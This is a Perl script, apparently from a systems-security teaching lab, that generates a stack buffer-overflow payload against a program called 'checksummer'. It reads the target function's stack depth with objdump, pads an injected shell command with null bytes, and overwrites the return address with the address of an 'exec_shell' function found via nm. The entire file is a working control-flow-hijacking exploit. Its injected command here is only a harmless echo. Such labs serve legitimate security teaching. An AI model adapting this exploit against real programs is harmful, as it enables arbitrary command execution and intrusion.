#! /usr/bin/perl
use bytes;

my $file;
if (defined($ARGV[0]) && -f $ARGV[0]) {
    $file = $ARGV[0];
} elsif (defined($ARGV[0]) && $ARGV[0] eq "-s") {
    $file = "checksummer";
} else {
    $file = "checksummer-unsafe";
}

my $stackdepth = 0;
my $stack = `objdump --disassemble=_Z8checksumPKcm $file | grep 'push\\|sub.*%rsp\$\\|add.*%rsp\$'`;
while ($stack =~ /^(.*:.*)$/mg) {
    my($l) = $1;
    if ($l =~ /push/) {
        $stackdepth += 8;
    } elsif ($l =~ /sub\s+\$0x([0-9a-f]+),\s*%rsp/i) {
        $stackdepth += hex($1);
    } elsif ($l =~ /add\s+\$0xffffffff([0-9a-f]+),\s*%rsp/i) {
        $stackdepth += 0x100000000 - hex($1);
    } else {
        last;    
    }
}

my $x = "echo OWNED OWNED OWNED 1>&2\n";
while (length($x) < $stackdepth) {
    $x .= "\x00";
}

my $addr = `nm $file | grep exec_shell`;
if ($addr =~ /^([0-9a-f]{16}) T _Z10exec_shell/m) {
    for ($i = 0; $i != 16; $i += 2) {
        $x .= pack("H*", substr($1, 14 - $i, 2));
    }
} else {
    print STDERR "No exec_shell!\n";
    exit(1);
}

print $x;
